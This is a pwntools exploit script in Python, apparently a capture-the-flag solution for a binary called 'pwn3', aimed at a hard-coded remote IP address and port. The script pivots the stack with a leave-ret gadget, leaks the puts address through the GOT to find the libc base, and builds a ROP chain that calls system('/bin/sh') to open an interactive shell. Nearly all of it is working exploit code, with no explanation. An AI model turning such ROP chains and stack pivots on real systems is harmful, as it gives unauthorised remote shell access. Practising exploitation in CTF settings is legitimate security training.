from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8003]
libc=ELF('./libc-2.31.so')
elf = ELF("pwn3")
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn3")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

pop_rdi = p64(0x4012f3)
puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
main = p64(0x4011fb)
leave_ret = p64(0x401289)

gdb.attach(p)
ru(b'name\n')
payload = b'a' * (0x10) + pop_rdi + puts_got + puts_plt + main
s(payload)
ru(b'pivoting?\n')
payload2 = b'a' * 0x60 + p64(0x405008) + leave_ret
s(payload2)
puts_addr = u64(rc(6).ljust(8,b'\x00'))
pr('puts_addr',puts_addr)
libc_base = puts_addr - libc.sym['puts']
pr('libc_base',libc_base)
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
ru(b'name\n')
payload3 = b'a'* 0x80 + pop_rdi + p64(binsh_addr) + p64(system_addr)
s(payload3)
ru(b'pivoting?')
payload4 = b'a' * 0x60 + p64(0x405078) + leave_ret
s(payload4)

shell()
